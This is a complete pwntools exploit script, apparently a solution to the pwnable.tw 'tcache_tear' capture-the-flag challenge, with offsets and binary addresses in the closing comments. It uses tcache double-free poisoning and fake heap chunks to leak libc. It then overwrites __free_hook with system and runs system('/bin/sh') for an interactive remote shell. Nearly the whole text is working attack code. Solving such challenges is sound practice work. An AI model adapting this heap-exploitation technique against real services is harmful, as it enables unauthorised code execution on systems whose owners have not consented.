from pwn import *

local = False

if local:
	r = process("./tcache_tear")
	#gdb.attach(r)
	malloc_hook_off = 0x3ebc30
	free_hook_off = 0x3ed8e8
	sys_off = 0x4f440
	binsh_off = 0x1b3e9a
else:
	r = remote("chall.pwnable.tw", 10207)
	malloc_hook_off = 0x3ebc30
	free_hook_off = 0x3ed8e8
	sys_off = 0x4f440
	binsh_off = 0x1b3e9a

r.recvuntil("Name:")
payload = "a"*16 + p64(0) + p64(0x21)
r.send(payload)
r.recvuntil("Your choice :")

def malloc_f(size, data):
	r.sendline(str(1))
	r.recvuntil("Size:")
	r.sendline(str(size))
	r.recvuntil("Data:")
	r.send(data)
	r.recv()
	#r.recvuntil("Your choice :")
def free_f():
	r.sendline(str(2))
	r.recvuntil("Your choice :")

malloc_f(0x60, "karthus")
free_f()
free_f()
malloc_f(0x60, p64(0x602550))
malloc_f(0x60, "karthus")
payload = p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)
malloc_f(0x60, payload)


malloc_f(0x80, "lux")
free_f()
free_f()
malloc_f(0x80, p64(0x602050))
malloc_f(0x80, "lux")
payload = p64(0) + p64(0x501) + "a"*0x28 + p64(0x602060)
malloc_f(0x80, payload)

free_f()

r.sendline(str(3))
s = r.recvuntil("Your choice :")[6:14]
base = u64(s) - malloc_hook_off - 96 - 16
sys_addr = base + sys_off
binsh_addr = base + binsh_off
free_hook_addr = base + free_hook_off

malloc_f(0x50, "sona")
free_f()
free_f()
malloc_f(0x50, p64(free_hook_addr))
malloc_f(0x50, "sona")
malloc_f(0x50, p64(sys_addr))

malloc_f(0x40, "/bin/sh\x00")
r.sendline(str(2))
r.interactive()




	
'''
name = 0x602060
ptr = 0x602088
read_name = 0x400bf6
read_option = 0x400c11
main: 0x400bc7 - 0x400c84
malloc_func: 0x400b14 - 0x400b98
read_size = 0x400b3a
read_data = 0x400b84
malloc = 0x400b54
free = 0x400c54
atoll = 0x400a02
read_real_size = 0x4009f6
'''
"""
option_read_size = 0x7fffffffdcb0
"""
